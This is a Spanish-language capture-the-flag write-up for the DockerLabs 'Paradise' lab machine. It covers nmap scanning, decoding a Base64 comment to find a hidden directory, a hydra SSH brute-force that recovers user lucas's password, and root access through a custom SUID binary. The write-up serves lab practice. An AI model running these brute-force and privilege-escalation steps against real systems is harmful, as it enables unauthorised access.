---
icon: flag
---

# Paradise DockerLabs (Easy)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip paradise.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh paradise.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-18 15:06 EST
Nmap scan report for 172.17.0.2
Host is up (0.000022s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 a1:bc:79:1a:34:68:43:d5:f4:d8:65:76:4e:b4:6d:b1 (DSA)
|   2048 38:68:b6:3b:a3:b2:c9:39:a3:d5:f9:97:a9:5f:b3:ab (RSA)
|   256 d2:e2:87:58:d0:20:9b:d3:fe:f8:79:e3:23:4b:df:ee (ECDSA)
|_  256 b7:38:8d:32:93:ec:4f:11:17:9d:86:3c:df:53:67:9a (ED25519)
80/tcp  open  http        Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Andys's House
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: PARADISE)
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: PARADISE)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: Host: UBUNTU; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: b501da0b8f9b
|   NetBIOS computer name: UBUNTU\x00
|   Domain name: \x00
|   FQDN: b501da0b8f9b
|_  System time: 2025-02-18T20:06:38+00:00
| smb2-time: 
|   date: 2025-02-18T20:06:39
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.56 seconds
```

Si vamos a la pagina veremos algo normal, pero si le damos a `Go paradise` e inspeccionamos el codigo veremos lo siguiente:

```html
<!-- ZXN0b2VzdW5zZWNyZXRvCg== -->
```

Vemos que esta codificado en `Base64` por lo que lo decodificaremos:

```shell
echo "ZXN0b2VzdW5zZWNyZXRvCg==" | base64 -d
```

Info:

```
estoesunsecreto
```

Por lo que podemos creer puede ser una contraseña de algun usuario, pero no vamos a tener suerte con ello, si lo intentamos poner como un directorio de `URL` veremos que si funciona:

```
URL = http://<IP>/estoesunsecreto
```

Y vemos un archivo llamado `mensaje_para_lucas.txt` que contiene lo siguiente:

```
REMEMBER TO CHANGE YOUR PASSWORD ACCOUNT, BECAUSE YOUR PASSWORD IS DEBIL AND THE HACKERS CAN FIND USING B.F.
```

Por lo que vemos el usuario `lucas` tiene una contraseña debil, por lo que vamos a tirarle un ataque de fuerza bruta con `hydra`, probaremos primero por `SSH`.

## Escalate user lucas

### Hydra

```shell
hydra -l lucas -P <WORDLIST> ssh://<IP> -t 64 
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-18 15:11:11
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: lucas   password: chocolate
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 7 final worker threads did not complete until end.
[ERROR] 7 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-18 15:11:13
```

Vemos que hemos obtenido las credenciales del usuario `lucas`, por lo que nos meteremos por `SSH`.

### SSH

```shell
ssh lucas@<IP>
```

Metemos como contraseña `chocolate` y veremos que estamos dentro.

## Escalate Privileges

Si listamos los permisos `SUID` que tenemos, veremos lo siguiente:

```shell
find / -type f -perm -4000 -ls 2>/dev/null
```

Info:

```
2406747   36 -rwsr-xr-x   1 root     root        36592 May 16  2017 /usr/bin/newgrp
2406865  152 -rwsr-xr-x   1 root     root       155008 May 29  2017 /usr/bin/sudo
2406607   44 -rwsr-xr-x   1 root     root        41336 May 16  2017 /usr/bin/chsh
2406604   48 -rwsr-xr-x   1 root     root        46424 May 16  2017 /usr/bin/chfn
2406760   48 -rwsr-xr-x   1 root     root        47032 May 16  2017 /usr/bin/passwd
2406678   72 -rwsr-xr-x   1 root     root        72280 May 16  2017 /usr/bin/gpasswd
2515879   12 -rwsr-xr-x   1 root     root        10240 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
2529841  432 -rwsr-xr-x   1 root     root       440416 Mar  4  2019 /usr/lib/openssh/ssh-keysign
2623342   12 -rwsr-xr-x   1 root     root         8789 Aug 30 13:13 /usr/local/bin/privileged_exec
2623261    4 -rwsr-xr-x   1 root     root          237 Jul 27  2024 /usr/local/bin/backup.sh
2404972   68 -rwsr-xr-x   1 root     root        69120 Nov 23  2016 /bin/umount
2404945   44 -rwsr-xr-x   1 root     root        44680 May  7  2014 /bin/ping6
2404964   40 -rwsr-xr-x   1 root     root        36936 May 16  2017 /bin/su
2404931   96 -rwsr-xr-x   1 root     root        94792 Nov 23  2016 /bin/mount
2404944   44 -rwsr-xr-x   1 root     root        44168 May  7  2014 /bin/ping
```

Y vemos que esta la siguiente linea bastante interesante:

```
2623342  12 -rwsr-xr-x  1 root  root  8789 Aug 30 13:13 /usr/local/bin/privileged_exec
```

Y si ejecutamos esto directamente:

```shell
/usr/local/bin/privileged_exec
```

Info:

```
Running with effective UID: 0
root@b501da0b8f9b:~# whoami
root
```

Veremos que somos `root` directamente, por lo que habremos terminado la maquina.
